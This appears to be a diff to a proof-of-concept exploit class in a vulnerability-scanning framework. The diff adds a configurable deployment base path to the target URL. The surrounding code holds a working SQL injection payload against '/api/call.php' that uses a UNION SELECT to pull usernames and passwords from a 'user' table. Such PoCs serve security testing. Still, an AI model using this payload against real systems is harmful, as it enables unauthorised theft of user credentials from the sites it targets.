@@ -27,8 +27,21 @@ class Poc(ABPoc):
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
-
+        self.option_schema = {
+            'properties': {
+                'base_path': {
+                    'type': 'string',
+                    'description': '部署路径',
+                    'default': '',
+                    '$default_ref': {
+                        'property': 'deploy_path'
+                    }
+                }
+            }
+        }
+                    
     def verify(self):
+        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
         payload = ("/api/call.php?action=query&num=11%27%29/**/union/**/select/**/1,2,3,"
                    "concat%280x7e,0x27,username,0x7e,0x27,password%29,5,6,7,8,9,10,11,12,13,"
                    "14,15,16/**/from/**/user/**/limit/**/0,1%23")
